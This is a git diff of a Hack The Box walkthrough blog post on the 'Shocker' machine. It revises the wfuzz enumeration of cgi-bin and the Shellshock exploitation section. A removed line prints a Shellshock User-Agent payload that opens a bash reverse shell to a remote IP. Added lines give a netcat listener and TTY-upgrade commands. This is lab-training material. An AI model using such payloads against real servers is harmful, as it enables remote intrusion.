@@ -1,7 +1,7 @@
 ---
 title: "Shocker"
 date: 2023-06-24T23:12:03+02:00
-tags: ["privesc","web","linux"]
+tags: ["lxd/lcd","web","linux","perl"]
 categories: ["hackthebox"]
 author: "0x0Pwn"
 image: /HTB/Shocker.png
@@ -46,14 +46,14 @@ editPost:
 ## Tools Used
 
 - Nmap
-- Gobuster
+- Wfuzz
 - Burpsuite
 
 ## Port Scanning
 
 We can find two service up and running one web server in the port 80 and a ssh in port 2222
 
-![Untitled](/HTB/shocker-1.png)
+![Untitled](/HTB/escaneo-shocker.png)
 
 ## Enumeration
 
@@ -63,34 +63,43 @@ If we visit the page we find a basic page with a basic html with only a picture.
 
 ![Untitled](/HTB/shocker-3.png)
 
-When I tried to fuzz the directories of the website, I found that gobuster doesn’t found anything and after several tests i realized that the website only recognize directories adding “/” at the end of the URL.
+When I tried to fuzz the directories of the website, I found that gobuster doesn’t found anything and after several
+tests i realized that the website only recognize directories adding “/” at the end of the URL. So after that I
+used wfuzz with this commands: `wfuzz -c --hc=404 -t 200  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/`.
+
+And then when I realized that a folder called cgi-bin exists, I do this: `wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z`
+To find out which scripts are contained in the folder. 
 
 ![Untitled](/HTB/shocker-4.png)
 
 ![Untitled](/HTB/shocker-5.png)
 
 Thanks to the error message of the website, it is observed that when no slash is added, a "not found" page is returned. In this example, the "cgi-bin" directory is tested. "cgi-bin" is specifically tested because the name of the machine gives a clue that it is likely vulnerable to the Shellshock Bash remote code execution vulnerability, which affects web servers utilizing CGI (Common Gateway Interface).
+Once I saw that the victim machine contained this folder, the vulnerability called ShellShock, which consists of remotely executing commands using the User-Agent, immediately came to my mind. 
 
-![Untitled](/HTB/shocker-6.png)
+![Untitled](/HTB/wfuzz-shocker.png)
 
-A quick fuzzing with the flag "-f" in Gobuster is performed, forcing the slash at the end of the URL. Three directories are discovered. Now, the "/cgi-bin/" directory is fuzzed to search for any interesting file such as .php, .py, .html, .js, or .sh. In this case, the "-f" flag is not used because files are being searched for.
+With this directory scan I found that cgi-bin folder exists
 
-![Untitled](/HTB/shocker-7.png)
+![Untitled](/HTB/wfuzz2-shocker.png)
 
-We find a file named [user.sh](http://user.sh), lets open it
+And with this, finally I found that an archive called user.txt exists inside the folder.
 
-![Untitled](/HTB/shocker-8.png)
+Having seen all this, I now focused on the shellshock vulnerability, which consisted in modifying the header of the get http request to be able to execute commands remotely. I personally used the program curl in terminal, but it can also be done from BurpSuite. It should be noted that before executing the request I listened with `nc -nlvp 443`.
 
-Upon opening it, it is revealed that the file is actually [test.sh](http://test.sh) file
+![Untitled](/HTB/shellshock-shocker.png)
 
-Now let’s focus on the Shellshock vulnerability, the basis of this vuln is to edit the http request to modify the User-Agent to “() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.10/1234 0>&1” we can do that with burp and allows us with a listening port to have a reverse shell. 
+Finally, the machine is pawned !!!
 
-I got all the information about Shellshock here: https://ethicalhackingguru.com/how-to-exploit-the-shellshock-vulnerability/
+## TTY Treatment
 
-![Untitled](/HTB/shocker-9.png)
-
-![Untitled](/HTB/shocker-10.png)
-
+```bash
+script /dev/null -c bash
+ctrl + z
+stty raw -echo; fg
+restet xterm
+export TERM=xterm
+```
 ## Gaining an Initial Foothold
 
 Once in the home of the pwned user shelly we can see a user.txt which has the flag
@@ -101,7 +110,7 @@ Once in the home of the pwned user shelly we can see a user.txt which has the fl
 
 ## Privilege Escalation
 
-Now we are in let’s elevate privilege
+Now we are in, let’s elevate privilege
 
 ![Untitled](/HTB/shocker-13.png)
 
